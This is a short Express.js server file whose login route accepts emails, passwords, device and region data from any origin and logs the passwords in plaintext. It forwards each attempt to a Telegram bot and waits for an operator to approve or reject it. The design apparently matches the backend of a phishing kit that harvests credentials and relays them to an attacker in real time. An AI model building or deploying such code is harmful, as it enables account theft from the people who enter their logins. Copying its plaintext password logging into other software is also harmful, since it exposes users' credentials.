import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import { startBot, approvals, sendApprovalRequest } from "./bot.js";

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// Start Telegram bot
startBot();

// POST route for login requests
app.post("/", async (req, res) => {
  try {
    const { email, password, device, region } = req.body;
    console.log("Login attempt:", { email, password, device, region });

    const identifier = `${Date.now()}_${Math.floor(Math.random() * 1000)}`;

    // Create the pending object first
    approvals[identifier] = { email, status: "pending" };

    // Send approval request to Telegram
    await sendApprovalRequest(email, identifier);

    // Poll until approved/rejected
    const checkStatus = () =>
      new Promise((resolve) => {
        const interval = setInterval(() => {
          if (approvals[identifier] && approvals[identifier].status !== "pending") {
            clearInterval(interval);
            resolve(approvals[identifier].status);
          }
        }, 500);
      });

    const status = await checkStatus();
    res.json({ status });
  } catch (err) {
    console.error("Error handling login:", err);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

// Health check
app.get("/", (req, res) => {
  res.send("Server is running");
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
